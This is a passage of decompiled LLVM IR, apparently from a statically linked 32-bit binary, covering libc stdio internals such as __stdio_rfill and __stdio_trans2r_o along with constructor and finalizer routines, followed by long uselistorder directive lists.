  %v4_8057e8d = call i32 @__libc_read(i32 %v3_8057e8a, i32* %v3_8057e8d, i32 %v0_8057e85)
  store i32 %v4_8057e8d, i32* %eax.global-to-local, align 4
  %tmp13 = icmp slt i32 %v4_8057e8d, 1
  %tmp14 = icmp eq i1 %tmp13, false
  br i1 %tmp14, label %dec_label_pc_8057ea8, label %dec_label_pc_8057e9a

dec_label_pc_8057e9a:                             ; preds = %dec_label_pc_8057e84
  %v1_8057e95 = icmp eq i32 %v4_8057e8d, 0
  %v4_8057e98 = icmp eq i1 %v1_8057e95, false
  %v0_8057ea2 = load i32, i32* @ebx, align 4
  %v1_8057ea2 = inttoptr i32 %v0_8057ea2 to i16*
  %v2_8057ea2 = load i16, i16* %v1_8057ea2, align 2
  br i1 %v4_8057e98, label %dec_label_pc_8057ea2, label %dec_label_pc_8057e9c

dec_label_pc_8057e9c:                             ; preds = %dec_label_pc_8057e9a
  %v3_8057e9c = or i16 %v2_8057ea2, 4
  store i16 %v3_8057e9c, i16* %v1_8057ea2, align 2
  %v0_8057eab.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057ea8

dec_label_pc_8057ea2:                             ; preds = %dec_label_pc_8057e9a
  %v3_8057ea2 = or i16 %v2_8057ea2, 8
  store i16 %v3_8057ea2, i16* %v1_8057ea2, align 2
  store i32 0, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_8057ea8

dec_label_pc_8057ea8:                             ; preds = %dec_label_pc_8057e84, %entry, %dec_label_pc_8057e9c, %dec_label_pc_8057ea2
  %v0_8057eab = phi i32 [ %v4_8057e8d, %dec_label_pc_8057e84 ], [ 0, %entry ], [ %v0_8057eab.pre, %dec_label_pc_8057e9c ], [ 0, %dec_label_pc_8057ea2 ]
  %v2_8057eaa = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_8057eaa, i32* @ebx, align 4
  ret i32 %v0_8057eab

; uselistorder directives
  uselistorder i16 %v2_8057ea2, { 1, 0 }
  uselistorder i32 %v4_8057e8d, { 1, 2, 0, 3 }
  uselistorder i16 4, { 1, 0 }
  uselistorder i32 4, {}
  uselistorder i32 2147483647, { 0, 2, 1, 3 }
  uselistorder i8 0, { 134, 40, 5, 8, 9, 41, 7, 6, 135, 136, 137, 138, 11, 144, 139, 140, 10, 142, 143, 141, 36, 145, 2, 3, 81, 82, 146, 147, 38, 148, 12, 14, 114, 113, 13, 42, 149, 150, 151, 152, 153, 154, 155, 156, 157, 158, 159, 160, 161, 162, 17, 168, 164, 165, 163, 15, 166, 167, 16, 37, 169, 170, 171, 172, 173, 174, 175, 225, 226, 19, 116, 115, 18, 117, 118, 176, 177, 178, 179, 180, 181, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 4, 192, 193, 194, 248, 195, 249, 252, 95, 43, 60, 96, 20, 251, 231, 232, 233, 234, 235, 236, 237, 238, 239, 44, 240, 217, 22, 126, 127, 21, 196, 197, 61, 1, 32, 33, 34, 31, 0, 45, 46, 47, 198, 216, 220, 221, 199, 200, 201, 202, 203, 204, 205, 23, 206, 207, 24, 208, 209, 210, 211, 212, 213, 214, 215, 79, 250, 125, 83, 84, 25, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109, 48, 110, 111, 112, 49, 119, 120, 121, 122, 123, 124, 62, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 77, 78, 39, 128, 129, 130, 131, 132, 133, 218, 219, 222, 223, 224, 26, 227, 228, 35, 229, 27, 230, 241, 246, 245, 28, 242, 243, 30, 244, 29, 247, 80, 50, 51, 52, 53, 54, 55, 56, 57, 58, 59 }
  uselistorder i8 4, { 4, 1, 0, 5, 6, 3, 2 }
  uselistorder i16* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8057ea8, { 3, 2, 0, 1 }
  uselistorder label %dec_label_pc_8057e84, { 1, 0 }
}

define i32 @__stdio_rfill(i32 %arg1) local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %v0_8057eac = load i32, i32* @ebx, align 4
  store i32 %arg1, i32* @ebx, align 4
  %v1_8057eb4 = add i32 %arg1, 8
  %v2_8057eb4 = inttoptr i32 %v1_8057eb4 to i32*
  %v3_8057eb4 = load i32, i32* %v2_8057eb4, align 4
  store i32 %v3_8057eb4, i32* %edx.global-to-local, align 4
  %v1_8057eb7 = add i32 %arg1, 12
  %v2_8057eb7 = inttoptr i32 %v1_8057eb7 to i32*
  %v3_8057eb7 = load i32, i32* %v2_8057eb7, align 4
  %v2_8057eba = sub i32 %v3_8057eb7, %v3_8057eb4
  %v3_8057ebf = inttoptr i32 %arg1 to i16*
  %v4_8057ebf = call i32 @__stdio_READ(i16* %v3_8057ebf, i32 %v3_8057eb4, i32 %v2_8057eba)
  %v0_8057ec4 = load i32, i32* @ebx, align 4
  %v1_8057ec4 = add i32 %v0_8057ec4, 8
  %v2_8057ec4 = inttoptr i32 %v1_8057ec4 to i32*
  %v3_8057ec4 = load i32, i32* %v2_8057ec4, align 4
  store i32 %v3_8057ec4, i32* %edx.global-to-local, align 4
  %v2_8057ec7 = add i32 %v0_8057ec4, 16
  %v3_8057ec7 = inttoptr i32 %v2_8057ec7 to i32*
  store i32 %v3_8057ec4, i32* %v3_8057ec7, align 4
  %v0_8057eca = load i32, i32* %edx.global-to-local, align 4
  %v2_8057eca = add i32 %v0_8057eca, %v4_8057ebf
  store i32 %v2_8057eca, i32* %edx.global-to-local, align 4
  %v1_8057ecc = load i32, i32* @ebx, align 4
  %v2_8057ecc = add i32 %v1_8057ecc, 20
  %v3_8057ecc = inttoptr i32 %v2_8057ecc to i32*
  store i32 %v2_8057eca, i32* %v3_8057ecc, align 4
  store i32 %v0_8057eac, i32* @ebx, align 4
  ret i32 %v4_8057ebf

; uselistorder directives
  uselistorder i32 %v4_8057ebf, { 1, 0 }
  uselistorder i32 20, { 23, 24, 25, 26, 27, 28, 29, 5, 30, 31, 7, 32, 6, 33, 34, 4, 11, 12, 21, 13, 35, 36, 37, 0, 38, 1, 39, 8, 40, 41, 42, 14, 15, 16, 17, 18, 19, 20, 9, 3, 22, 10, 2 }
  uselistorder i32 16, { 91, 92, 93, 94, 95, 97, 96, 8, 98, 99, 33, 2, 100, 34, 101, 102, 103, 3, 104, 105, 106, 107, 108, 109, 110, 111, 118, 112, 113, 114, 115, 116, 117, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 135, 136, 161, 35, 36, 50, 37, 61, 46, 53, 84, 54, 165, 154, 10, 9, 155, 0, 11, 151, 152, 42, 166, 137, 138, 139, 140, 141, 142, 1, 143, 144, 145, 146, 147, 12, 148, 149, 47, 150, 162, 163, 164, 55, 56, 57, 58, 59, 60, 49, 38, 62, 63, 64, 65, 68, 17, 14, 15, 16, 66, 67, 69, 72, 18, 19, 20, 70, 71, 73, 74, 75, 48, 76, 77, 5, 6, 78, 43, 79, 80, 81, 39, 41, 82, 44, 83, 40, 51, 30, 31, 32, 28, 29, 26, 27, 21, 22, 23, 24, 25, 52, 85, 86, 7, 87, 88, 89, 90, 13, 45, 153, 4, 156, 157, 158, 159, 160 }
  uselistorder i32 12, { 73, 74, 75, 76, 77, 0, 78, 20, 29, 79, 80, 101, 24, 23, 5, 81, 6, 7, 8, 9, 10, 11, 12, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 134, 28, 30, 66, 72, 31, 32, 102, 103, 104, 105, 106, 107, 108, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 25, 133, 97, 98, 99, 100, 135, 93, 1, 2, 94, 95, 13, 14, 96, 3, 33, 26, 34, 35, 36, 37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 15, 16, 57, 58, 59, 21, 60, 61, 62, 63, 27, 22, 64, 65, 19, 18, 17, 67, 68, 69, 70, 71, 4 }
  uselistorder i32 %arg1, { 0, 3, 2, 1 }
}

define i32 @__stdio_trans2r_o(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %v0_8057ed4 = load i32, i32* @ebx, align 4
  %v4_8057ed8 = ptrtoint i16* %arg1 to i32
  store i32 %v4_8057ed8, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_8057ee0 = bitcast i16* %arg1 to i32*
  %v2_8057ee0 = load i32, i32* %v1_8057ee0, align 4
  %v1_8057ee2 = urem i32 %v2_8057ee0, 65536
  %v2_8057ee5 = and i32 %v1_8057ee2, %arg2
  %v3_8057ee5 = icmp eq i32 %v2_8057ee5, 0
  %v1_8057ee7 = icmp eq i1 %v3_8057ee5, false
  br i1 %v1_8057ee7, label %dec_label_pc_8057ef6, label %dec_label_pc_8057ee9

dec_label_pc_8057ee9:                             ; preds = %entry
  %v1_8057ee9 = and i32 %v2_8057ee0, 2176
  %v2_8057ee9 = icmp eq i32 %v1_8057ee9, 0
  %v1_8057eef = icmp eq i1 %v2_8057ee9, false
  br i1 %v1_8057eef, label %dec_label_pc_8057efd, label %dec_label_pc_8057ef1

dec_label_pc_8057ef1:                             ; preds = %dec_label_pc_8057ee9
  %v2_8057ef1 = or i32 %v2_8057ee0, %arg2
  %v1_8057ef3 = trunc i32 %v2_8057ef1 to i16
  store i16 %v1_8057ef3, i16* %arg1, align 2
  %v0_8057ef6.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057ef6

dec_label_pc_8057ef6:                             ; preds = %entry, %dec_label_pc_8057ef1
  %v0_8057f18 = phi i32 [ %v4_8057ed8, %entry ], [ %v0_8057ef6.pre, %dec_label_pc_8057ef1 ]
  %v1_8057ef6 = inttoptr i32 %v0_8057f18 to i16*
  %v2_8057ef6 = load i16, i16* %v1_8057ef6, align 2
  %v2_8057ef9 = and i16 %v2_8057ef6, 16
  %v3_8057ef9 = icmp eq i16 %v2_8057ef9, 0
  br i1 %v3_8057ef9, label %dec_label_pc_8057f11, label %dec_label_pc_8057efd

dec_label_pc_8057efd:                             ; preds = %dec_label_pc_8057ef6, %dec_label_pc_8057ee9
  %v1_8057efd = call i32 @__errno_location(i32 %v0_8057ed4)
  %v1_8057f02 = inttoptr i32 %v1_8057efd to i32*
  store i32 9, i32* %v1_8057f02, align 4
  br label %dec_label_pc_8057f08

dec_label_pc_8057f08:                             ; preds = %dec_label_pc_8057f15, %dec_label_pc_8057efd
  %v0_8057f08 = load i32, i32* @ebx, align 4
  %v1_8057f08 = inttoptr i32 %v0_8057f08 to i16*
  %v2_8057f08 = load i16, i16* %v1_8057f08, align 2
  %v3_8057f08 = or i16 %v2_8057f08, 8
  store i16 %v3_8057f08, i16* %v1_8057f08, align 2
  br label %dec_label_pc_8057f35

dec_label_pc_8057f11:                             ; preds = %dec_label_pc_8057ef6
  %v2_8057f11 = and i16 %v2_8057ef6, 64
  %v3_8057f11 = icmp eq i16 %v2_8057f11, 0
  br i1 %v3_8057f11, label %dec_label_pc_8057f2f, label %dec_label_pc_8057f15

dec_label_pc_8057f15:                             ; preds = %dec_label_pc_8057f11
  %v2_8057f19 = call i32 @__stdio_wcommit(i32 %v0_8057f18)
  %v1_8057f21 = icmp eq i32 %v2_8057f19, 0
  %v1_8057f23 = icmp eq i1 %v1_8057f21, false
  br i1 %v1_8057f23, label %dec_label_pc_8057f08, label %dec_label_pc_8057f25

dec_label_pc_8057f25:                             ; preds = %dec_label_pc_8057f15
  %v0_8057f25 = load i32, i32* @ebx, align 4
  %v1_8057f25 = inttoptr i32 %v0_8057f25 to i16*
  %v2_8057f25 = load i16, i16* %v1_8057f25, align 2
  %v3_8057f25 = and i16 %v2_8057f25, -65
  store i16 %v3_8057f25, i16* %v1_8057f25, align 2
  %v0_8057f29 = load i32, i32* @ebx, align 4
  %v1_8057f29 = add i32 %v0_8057f29, 8
  %v2_8057f29 = inttoptr i32 %v1_8057f29 to i32*
  %v3_8057f29 = load i32, i32* %v2_8057f29, align 4
  %v2_8057f2c = add i32 %v0_8057f29, 28
  %v3_8057f2c = inttoptr i32 %v2_8057f2c to i32*
  store i32 %v3_8057f29, i32* %v3_8057f2c, align 4
  %v0_8057f2f.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8057f2f

dec_label_pc_8057f2f:                             ; preds = %dec_label_pc_8057f11, %dec_label_pc_8057f25
  %v9_8057f2f = phi i32 [ %v0_8057f18, %dec_label_pc_8057f11 ], [ %v0_8057f2f.pre, %dec_label_pc_8057f25 ]
  %v1_8057f2f = inttoptr i32 %v9_8057f2f to i16*
  %v2_8057f2f = load i16, i16* %v1_8057f2f, align 2
  %v3_8057f2f = or i16 %v2_8057f2f, 1
  store i16 %v3_8057f2f, i16* %v1_8057f2f, align 2
  br label %dec_label_pc_8057f35

dec_label_pc_8057f35:                             ; preds = %dec_label_pc_8057f08, %dec_label_pc_8057f2f
  %storemerge = phi i32 [ 0, %dec_label_pc_8057f2f ], [ -1, %dec_label_pc_8057f08 ]
  store i32 %v0_8057ed4, i32* @ebx, align 4
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_8057ee0, { 1, 2, 0 }
  uselistorder i32 %v0_8057ed4, { 1, 0 }
  uselistorder i16 1, { 1, 2, 0 }
  uselistorder i32 28, { 22, 23, 24, 17, 18, 25, 26, 27, 28, 45, 36, 29, 30, 2, 31, 32, 33, 34, 35, 4, 5, 6, 0, 37, 16, 38, 39, 40, 41, 42, 43, 1, 44, 46, 19, 20, 7, 8, 21, 13, 12, 10, 11, 14, 15, 9, 3 }
  uselistorder i32 8, { 124, 125, 126, 127, 129, 128, 130, 16, 17, 131, 132, 133, 134, 135, 136, 1, 137, 18, 10, 138, 139, 140, 141, 142, 143, 55, 144, 145, 57, 26, 27, 28, 29, 58, 30, 31, 32, 59, 33, 60, 34, 61, 62, 146, 147, 148, 149, 150, 151, 56, 152, 153, 154, 221, 222, 50, 228, 51, 229, 74, 52, 75, 35, 77, 118, 123, 78, 79, 175, 176, 177, 178, 179, 180, 181, 2, 182, 183, 184, 185, 186, 187, 188, 189, 190, 191, 3, 192, 193, 194, 195, 196, 64, 4, 65, 5, 197, 198, 199, 200, 201, 202, 203, 204, 205, 206, 207, 208, 209, 210, 211, 212, 213, 63, 214, 215, 6, 216, 217, 218, 219, 7, 220, 173, 174, 19, 227, 20, 21, 76, 155, 156, 157, 158, 160, 161, 162, 159, 163, 164, 165, 166, 36, 37, 167, 168, 169, 170, 171, 172, 22, 223, 224, 225, 226, 25, 66, 67, 0, 80, 81, 23, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 68, 106, 38, 53, 39, 107, 108, 69, 14, 40, 54, 41, 109, 110, 70, 15, 111, 112, 113, 114, 11, 115, 12, 71, 73, 42, 72, 116, 117, 49, 48, 46, 47, 43, 44, 45, 13, 119, 120, 121, 122, 24, 9, 8 }
  uselistorder i32 (i32)* @__stdio_wcommit, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i16 8, { 1, 2, 0, 3, 5, 4 }
  uselistorder i32 9, { 10, 11, 12, 13, 14, 6, 15, 16, 3, 8, 7, 17, 18, 19, 20, 5, 4, 0, 9, 2, 1 }
  uselistorder i32 (i32)* @__errno_location, { 48, 47, 46, 71, 70, 69, 45, 44, 43, 42, 41, 40, 25, 39, 38, 37, 30, 55, 24, 13, 12, 11, 10, 68, 9, 23, 22, 8, 21, 54, 53, 60, 59, 67, 66, 65, 20, 19, 52, 18, 33, 36, 35, 34, 0, 14, 51, 7, 6, 64, 32, 31, 63, 29, 1, 16, 2, 28, 15, 3, 50, 27, 26, 62, 61, 5, 4, 58, 57, 56, 72, 49, 17 }
  uselistorder i16 0, { 0, 7, 1, 8, 5, 6, 9, 11, 12, 13, 14, 10, 15, 16, 2, 3, 4 }
  uselistorder i32 65536, { 0, 1, 2, 4, 5, 3, 6, 83, 7, 8, 9, 10, 12, 11, 14, 13, 16, 15, 18, 17, 19, 20, 84, 86, 21, 22, 23, 28, 24, 29, 25, 30, 26, 31, 27, 35, 32, 36, 33, 37, 34, 38, 39, 41, 40, 43, 42, 44, 45, 49, 46, 50, 47, 51, 48, 52, 54, 53, 57, 55, 58, 56, 59, 60, 63, 61, 64, 62, 65, 66, 68, 67, 69, 70, 73, 74, 75, 71, 76, 72, 78, 77, 79, 81, 80, 82, 85 }
  uselistorder i32* @ecx, { 68, 27, 6, 8, 26, 7, 69, 70, 71, 72, 73, 74, 15, 75, 76, 77, 78, 16, 79, 80, 81, 82, 83, 84, 85, 86, 87, 88, 89, 90, 91, 92, 93, 94, 38, 43, 39, 40, 41, 42, 95, 9, 10, 49, 0, 50, 96, 97, 98, 12, 19, 99, 100, 17, 11, 18, 101, 102, 103, 104, 105, 106, 176, 177, 178, 179, 13, 51, 1, 52, 107, 108, 31, 109, 110, 111, 112, 113, 114, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 133, 134, 28, 135, 136, 137, 138, 139, 140, 29, 141, 25, 44, 45, 46, 47, 183, 184, 185, 186, 187, 188, 189, 190, 191, 192, 193, 194, 195, 196, 197, 198, 199, 200, 201, 202, 203, 204, 20, 205, 180, 181, 182, 206, 207, 208, 209, 210, 211, 212, 213, 214, 215, 216, 217, 218, 219, 21, 220, 221, 223, 224, 225, 222, 229, 168, 169, 170, 171, 172, 173, 174, 32, 33, 142, 143, 144, 145, 146, 147, 148, 30, 149, 14, 150, 151, 152, 153, 154, 22, 23, 2, 3, 155, 156, 24, 157, 158, 159, 160, 161, 163, 164, 165, 166, 36, 37, 162, 167, 227, 228, 230, 231, 232, 34, 35, 48, 53, 54, 55, 56, 57, 58, 59, 60, 61, 62, 63, 5, 64, 65, 66, 4, 67, 175, 226 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8057f35, { 1, 0 }
  uselistorder label %dec_label_pc_8057f2f, { 1, 0 }
  uselistorder label %dec_label_pc_8057ef6, { 1, 0 }
}

define i32 @__do_global_ctors_aux() local_unnamed_addr {
entry:
  %stack_var_-16 = alloca i32, align 4
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  store i32 %tmp6, i32* %stack_var_-16, align 4
  %v0_8057f4c = load i32, i32* @global_var_805f3c8.994, align 8
  %v10_8057f51 = icmp eq i32 %v0_8057f4c, -1
  br i1 %v10_8057f51, label %dec_label_pc_8057f62, label %dec_label_pc_8057f56.preheader

dec_label_pc_8057f56.preheader:                   ; preds = %entry
  br label %dec_label_pc_8057f56

dec_label_pc_8057f56:                             ; preds = %dec_label_pc_8057f56.preheader, %dec_label_pc_8057f56
  %v4_8057f59 = phi i32 [ %v0_8057f4c, %dec_label_pc_8057f56.preheader ], [ %v2_8057f5b, %dec_label_pc_8057f56 ]
  %v0_8057f56 = phi i32 [ ptrtoint (i32* @global_var_805f3c8.994 to i32), %dec_label_pc_8057f56.preheader ], [ %v1_8057f56, %dec_label_pc_8057f56 ]
  %v1_8057f56 = add i32 %v0_8057f56, -4
  call void @__pseudo_call(i32 %v4_8057f59)
  %v1_8057f5b = inttoptr i32 %v1_8057f56 to i32*
  %v2_8057f5b = load i32, i32* %v1_8057f5b, align 4
  %v10_8057f5d = icmp eq i32 %v2_8057f5b, -1
  %v1_8057f60 = icmp eq i1 %v10_8057f5d, false
  br i1 %v1_8057f60, label %dec_label_pc_8057f56, label %dec_label_pc_8057f62.loopexit

dec_label_pc_8057f62.loopexit:                    ; preds = %dec_label_pc_8057f56
  %v2_8057f62.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_8057f62

dec_label_pc_8057f62:                             ; preds = %dec_label_pc_8057f62.loopexit, %entry
  %v2_8057f62 = phi i32 [ %v2_8057f62.pre, %dec_label_pc_8057f62.loopexit ], [ %tmp6, %entry ]
  ret i32 %v2_8057f62

; uselistorder directives
  uselistorder i32 %v0_8057f4c, { 1, 0 }
  uselistorder i1 false, { 921, 626, 627, 628, 629, 58, 630, 631, 632, 3, 0, 1, 5, 633, 635, 634, 4, 637, 636, 638, 639, 640, 641, 59, 7, 60, 649, 644, 648, 646, 647, 82, 642, 643, 645, 6, 650, 651, 652, 653, 136, 138, 139, 140, 141, 137, 142, 143, 144, 147, 145, 146, 654, 655, 660, 61, 656, 657, 659, 658, 661, 662, 667, 666, 663, 664, 665, 8, 9, 319, 320, 321, 83, 668, 669, 670, 673, 671, 672, 10, 62, 674, 676, 675, 84, 677, 679, 678, 85, 680, 681, 682, 683, 684, 685, 686, 687, 688, 689, 690, 691, 692, 693, 694, 868, 63, 12, 695, 696, 697, 698, 700, 699, 11, 701, 702, 64, 703, 704, 705, 706, 707, 708, 709, 710, 711, 712, 713, 714, 850, 851, 853, 852, 13, 322, 323, 324, 325, 715, 716, 717, 718, 719, 720, 721, 722, 723, 724, 725, 726, 99, 727, 728, 729, 730, 731, 732, 733, 734, 735, 736, 737, 738, 739, 740, 741, 742, 743, 744, 745, 746, 747, 748, 749, 750, 751, 752, 753, 922, 923, 79, 754, 86, 755, 756, 757, 869, 870, 871, 924, 938, 939, 940, 941, 942, 945, 87, 946, 947, 944, 937, 925, 114, 381, 382, 383, 384, 385, 386, 926, 927, 171, 172, 173, 174, 175, 176, 14, 387, 388, 80, 392, 15, 393, 394, 403, 148, 930, 931, 932, 933, 934, 935, 936, 873, 874, 875, 876, 877, 878, 879, 880, 881, 882, 883, 884, 872, 885, 886, 887, 888, 889, 890, 891, 892, 56, 894, 893, 898, 895, 896, 897, 16, 899, 900, 389, 390, 858, 825, 826, 828, 829, 830, 943, 18, 397, 396, 17, 758, 759, 760, 88, 837, 838, 839, 840, 842, 841, 19, 843, 761, 20, 827, 844, 845, 762, 763, 764, 765, 766, 767, 768, 769, 770, 771, 772, 773, 774, 775, 776, 777, 778, 779, 780, 781, 783, 782, 21, 784, 785, 786, 787, 788, 790, 57, 791, 789, 792, 794, 793, 22, 795, 796, 798, 797, 89, 799, 800, 801, 802, 803, 804, 805, 806, 807, 808, 809, 810, 811, 812, 813, 814, 815, 816, 817, 818, 819, 820, 821, 822, 133, 134, 823, 824, 928, 90, 929, 23, 391, 861, 162, 151, 149, 150, 91, 152, 153, 154, 155, 24, 156, 157, 158, 159, 160, 161, 163, 164, 166, 165, 26, 25, 167, 168, 169, 170, 177, 178, 179, 180, 181, 182, 183, 184, 187, 100, 185, 186, 41, 42, 188, 98, 54, 65, 189, 190, 191, 97, 192, 193, 194, 195, 196, 197, 200, 101, 198, 199, 39, 40, 201, 66, 202, 203, 204, 205, 206, 207, 208, 211, 102, 209, 210, 37, 38, 212, 67, 213, 214, 215, 216, 217, 218, 219, 222, 103, 220, 221, 35, 36, 223, 68, 224, 225, 226, 227, 228, 229, 230, 233, 104, 231, 232, 33, 34, 234, 235, 236, 237, 238, 239, 241, 105, 240, 31, 32, 242, 69, 243, 244, 245, 246, 247, 248, 249, 250, 251, 254, 106, 252, 253, 29, 30, 255, 70, 256, 257, 258, 259, 260, 261, 262, 265, 107, 263, 264, 27, 28, 266, 71, 267, 268, 269, 270, 271, 272, 273, 274, 275, 276, 277, 278, 108, 279, 280, 281, 282, 283, 284, 285, 286, 287, 288, 289, 290, 291, 292, 293, 294, 295, 296, 297, 298, 299, 300, 301, 302, 303, 304, 305, 306, 307, 308, 309, 310, 311, 312, 313, 314, 315, 316, 317, 318, 326, 327, 328, 109, 349, 110, 329, 330, 331, 332, 333, 334, 335, 336, 337, 338, 339, 340, 341, 342, 343, 344, 345, 346, 347, 348, 92, 93, 350, 351, 352, 353, 354, 355, 356, 357, 358, 55, 359, 111, 360, 361, 362, 112, 363, 364, 113, 365, 366, 367, 368, 369, 370, 371, 372, 373, 374, 375, 376, 377, 378, 379, 380, 115, 116, 117, 118, 119, 120, 121, 122, 123, 124, 125, 126, 127, 128, 129, 130, 131, 132, 395, 398, 72, 399, 400, 401, 44, 402, 43, 404, 405, 406, 407, 408, 409, 410, 411, 412, 413, 414, 415, 416, 417, 418, 419, 420, 421, 422, 423, 424, 425, 426, 427, 428, 429, 430, 431, 432, 433, 434, 435, 436, 437, 438, 439, 440, 441, 442, 443, 444, 445, 446, 447, 448, 449, 450, 451, 452, 453, 454, 455, 456, 457, 458, 459, 460, 461, 462, 463, 464, 465, 466, 467, 468, 469, 470, 471, 472, 473, 474, 475, 476, 477, 478, 479, 480, 481, 482, 483, 484, 485, 486, 487, 488, 489, 490, 491, 492, 493, 494, 495, 496, 497, 498, 499, 500, 501, 502, 503, 504, 505, 506, 507, 508, 509, 510, 511, 512, 513, 514, 515, 516, 517, 518, 519, 520, 521, 522, 523, 524, 525, 526, 527, 528, 529, 530, 531, 532, 533, 534, 535, 536, 537, 538, 539, 540, 541, 542, 543, 544, 545, 546, 547, 548, 549, 550, 551, 552, 553, 554, 555, 556, 557, 558, 559, 560, 561, 562, 563, 564, 565, 566, 567, 568, 569, 570, 571, 572, 573, 574, 575, 576, 577, 578, 579, 580, 581, 582, 583, 584, 585, 586, 587, 588, 589, 590, 591, 592, 593, 594, 595, 596, 597, 598, 599, 600, 601, 602, 603, 604, 605, 606, 607, 608, 609, 610, 611, 73, 612, 613, 614, 615, 616, 81, 617, 618, 619, 620, 621, 622, 623, 624, 625, 831, 832, 96, 833, 74, 834, 75, 835, 836, 45, 848, 846, 847, 46, 849, 47, 854, 855, 856, 48, 857, 2, 859, 860, 862, 863, 864, 76, 865, 866, 867, 901, 917, 902, 903, 904, 905, 910, 914, 915, 916, 49, 906, 94, 907, 908, 909, 77, 53, 911, 52, 78, 51, 912, 913, 50, 918, 919, 920, 135, 95, 948 }
  uselistorder void (i32)* @__pseudo_call, { 2, 1, 4, 5, 6, 7, 3, 0 }
  uselistorder i32 -4, { 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 7, 23, 50, 51, 52, 53, 59, 60, 61, 62, 5, 63, 1, 58, 64, 65, 66, 67, 68, 69, 8, 57, 55, 56, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 2, 54, 35, 6, 36, 37, 38, 39, 4, 10, 40, 41, 42, 0, 43, 44, 45, 46, 47, 9, 3, 48, 49 }
  uselistorder i32 ptrtoint (i32* @global_var_805f3c8.994 to i32), { 1, 3, 4, 0, 5, 6, 2 }
  uselistorder i32 -1, {}
  uselistorder i32 1, {}
  uselistorder label %dec_label_pc_8057f56, { 1, 0 }
}

define i32 @_fini() local_unnamed_addr {
entry:
  %v0_8057f6b = load i32, i32* @ebx, align 4
  %v1_8057f6c = call i32 @__get_pc_thunk_bx(i32 %v0_8057f6b)
  store i32 %v1_8057f6c, i32* @eax, align 4
  %v0_8057f77 = call i32 @__do_global_dtors_aux()
  ret i32 %v0_8057f77

; uselistorder directives
  uselistorder i32* @eax, { 16, 114, 3, 35, 116, 0, 5, 117, 118, 4, 119, 1, 34, 2, 115, 120, 36, 121, 64, 65, 67, 17, 66, 122, 124, 123, 7, 8, 125, 126, 127, 37, 128, 129, 130, 131, 132, 133, 134, 135, 136, 38, 137, 138, 139, 140, 141, 39, 40, 142, 41, 143, 42, 43, 144, 187, 145, 44, 146, 45, 147, 148, 149, 46, 150, 6, 47, 48, 151, 152, 49, 153, 50, 154, 155, 51, 52, 53, 156, 157, 158, 159, 54, 160, 161, 162, 163, 55, 175, 189, 190, 60, 191, 192, 194, 61, 195, 9, 193, 14, 15, 188, 103, 18, 68, 69, 109, 70, 176, 178, 179, 177, 180, 181, 183, 184, 182, 173, 58, 10, 11, 164, 166, 165, 167, 168, 170, 63, 169, 171, 172, 19, 71, 72, 73, 74, 75, 20, 76, 77, 21, 22, 78, 79, 80, 81, 23, 82, 24, 83, 25, 84, 26, 85, 27, 86, 28, 87, 56, 88, 57, 89, 29, 30, 90, 91, 92, 93, 94, 95, 96, 97, 98, 99, 31, 100, 32, 101, 102, 33, 62, 104, 105, 106, 107, 108, 110, 111, 112, 113, 59, 174, 196, 185, 186, 12, 13 }
  uselistorder i32 (i32)* @__get_pc_thunk_bx, { 1, 0 }
  uselistorder i32 0, { 373, 2125, 2126, 2127, 151, 152, 1807, 2128, 2129, 1808, 2130, 18, 19, 20, 70, 1809, 2131, 2134, 2132, 2133, 1810, 2135, 153, 2136, 2137, 2138, 290, 2139, 2140, 2141, 21, 72, 2144, 2151, 2145, 2146, 22, 62, 2147, 2148, 2149, 1811, 2150, 71, 142, 143, 144, 2142, 2143, 154, 2152, 2153, 2155, 2156, 2154, 2157, 291, 2158, 2159, 2160, 2161, 2162, 2163, 155, 156, 1812, 374, 375, 125, 1924, 1813, 1925, 1926, 75, 76, 1927, 1928, 1929, 1776, 1930, 74, 1814, 73, 1815, 157, 0, 1, 1816, 158, 159, 1817, 1818, 1819, 160, 1820, 2166, 1821, 2164, 281, 2165, 376, 377, 161, 2, 3, 1822, 2167, 2168, 2169, 2170, 2171, 378, 1823, 1824, 162, 2172, 23, 77, 2043, 126, 127, 1825, 2173, 78, 1826, 24, 163, 2174, 79, 1827, 2175, 1828, 2177, 2176, 267, 1829, 1830, 2178, 2180, 2179, 268, 1831, 2181, 164, 2182, 1832, 2183, 2184, 2185, 2186, 2187, 2188, 2189, 2190, 2191, 2192, 292, 2193, 1833, 1834, 2194, 2195, 2196, 15, 293, 166, 165, 2197, 2198, 294, 2199, 2200, 2201, 1835, 2202, 2203, 2204, 2205, 167, 2206, 1836, 2207, 2208, 168, 1837, 169, 379, 2209, 2210, 2211, 2212, 134, 25, 2213, 80, 2214, 2215, 2216, 2217, 2218, 2219, 2225, 2226, 2227, 2228, 2220, 